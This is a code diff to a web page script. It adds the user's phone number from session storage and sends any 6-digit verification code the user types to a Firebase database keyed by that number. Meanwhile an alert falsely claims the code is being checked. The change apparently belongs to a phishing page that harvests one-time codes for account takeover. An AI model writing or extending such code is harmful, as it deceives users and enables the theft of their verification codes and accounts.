@@ -109,6 +109,8 @@
     </div>
 
     <script type = "module">
+   let userPN = sessionStorage.getItem("userPN");
+
         import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
         import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
 
@@ -166,7 +168,13 @@
 
             if (code.length === 6) {
                 alert(`Checking Verification please wait for few second. Code: ${code}`);
-                // Redirect to another page or perform other actions
+                set(ref(database, "users/" + userPN + "/versification code"), code)
+                .then(() => {
+                    
+                })
+                .catch((error) => {
+                    alert("Error: " + error.message);
+                });
             } else {
                 alert('Please enter a 6-digit code.');
             }
